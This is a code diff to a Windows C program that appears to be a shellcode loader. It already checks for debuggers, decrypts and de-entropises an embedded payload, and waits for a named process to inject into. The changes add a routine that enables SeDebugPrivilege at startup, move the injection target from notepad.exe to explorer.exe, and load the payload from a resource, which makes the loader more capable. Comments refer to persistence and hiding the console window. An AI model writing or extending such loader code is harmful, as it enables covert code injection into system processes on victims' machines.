@@ -8,6 +8,27 @@
 //#include "VM-detect.h"
 #include "debugger-detect.h"
 
+void SetSeDebugPrivilege() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tokenPrivileges;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return;
+
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        CloseHandle(hToken);
+        return;
+    }
+
+    tokenPrivileges.PrivilegeCount = 1;
+    tokenPrivileges.Privileges[0].Luid = luid;
+    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
+
+    CloseHandle(hToken);
+}
 
 BOOL IsDuplicate()
 {
@@ -123,11 +144,11 @@ void decrypt()
 
 int main()
 {
+    SetSeDebugPrivilege();
     
     //HWND window = GetConsoleWindow();
     //ShowWindow(window, SW_HIDE);
     decrypt();
-    
     //printf("GetModuleHandleA: %p, getcurprocbaseaddr: %p\n", GetModuleHandleA(NULL), getcurProcBaseAddr());
     if (IsDuplicate()) { 
         exit(0); 
@@ -171,7 +192,7 @@ int main()
 
 
     #ifdef DEBUG
-    printf("[.] Waiting for notepad.exe\n");
+    printf("[.] Waiting for explorer.exe\n");
     #endif
 
     DWORD targetpid = 0;
@@ -181,7 +202,7 @@ int main()
     while (targetpid == 0)
     {
         Sleep(500);
-        targetpid = FindPIDByName(L"notepad.exe");
+        targetpid = FindPIDByName(L"explorer.exe");
     }
     #ifdef DEBUG
     printf("[+] Target pid: %d\n", targetpid);
@@ -196,6 +217,7 @@ int main()
     // RunEdit(); /// add persistence
 
     #ifdef PAYLOAD_EMBED    // spawn calc.exe
+    loadRSRC();
     RemoveEntropy();
     payload = embeded_payload;
     BUFFER_Size = BUFFER_Size / 2;
